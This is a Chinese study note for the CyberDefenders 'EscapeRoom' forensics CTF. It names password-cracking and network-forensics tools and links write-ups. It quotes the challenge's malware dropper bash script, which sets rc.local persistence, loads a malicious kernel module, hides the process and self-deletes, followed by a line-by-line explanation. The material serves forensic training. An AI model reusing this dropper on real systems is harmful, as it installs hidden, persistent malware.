# 知识点
[Hydra](https://zhuanlan.zhihu.com/p/397779150) 常用于爆破ssh密码<br />[John the Ripper](https://xz.aliyun.com/t/3958)   密码破解器
```shell
#!/bin/bash
mv 1 /var/mail/mail
chmod +x /var/mail/mail
echo -e "/var/mail/mail &\nsleep 1\npidof mail > /proc/dmesg\nexit 0" > /etc/rc.local
nohup /var/mail/mail > /dev/null 2>&1&
mv 2 /lib/modules/`uname -r`/sysmod.ko
depmod -a
echo "sysmod" >> /etc/modules
modprobe sysmod
sleep 1
pidof mail > /proc/dmesg
rm 3

"""
So payload 3 is a bash script that gives us some insights into the other two payloads. Line by line, let’s follow the script:

1、Rename payload 1 to /var/mail/mail
2、Change P1’s (/var/mail/mail) permissions to executable
3、Echo the following string of commands to /etc/rc.local:
	1、Launch Payload 1
	2、Sleep 1 second
	3、Send the PID of mail (malware) to /proc/dmesg (This sends the PID to the kernel)
	4、exit shell
4、Use nohup to run Payload 1 (/var/mail/mail) in the background, redirect standard output to /dev/null, redirect standard error to standard output (this means silence errors)
5、Rename Payload 2 to sysmod.ko and move it to /lib/modules/[insert_kernel_version]/. Kernel version is inserted inline using “uname -r”
6、Generate dependency lists for all kernel modules using depmod
7、Add sysmod to the list of modules at /etc/modules
8、Add malicious module sysmod to the kernel (Payload 2)
9、Sleep for a second
10、Hide the PID of running Payload 1 (mail)
11、Delete this file
"""
```
# 工具

- [Wireshark](https://www.wireshark.org/)
- [NetworkMiner](https://www.netresec.com/?page=networkminer)
- [BrimSecurity](https://www.brimdata.io/download/)
- [UPX](https://upx.github.io/)
- [IDA](https://www.hex-rays.com/ida-pro/ida-disassembler/)
# 思路
[CyberDefenders: EscapeRoom](https://forensicskween.com/ctf/cyberdefenders/escaperoom/)<br />[CyberDefenders Writeup EscapeRoom](https://4n6nk8s.tech/2022/09/07/CyberDefenders/EscapeRoom/)<br />[EscapeRoom (CyberDefenders) – Pending Investigations](https://ihack.blue/archives/219)

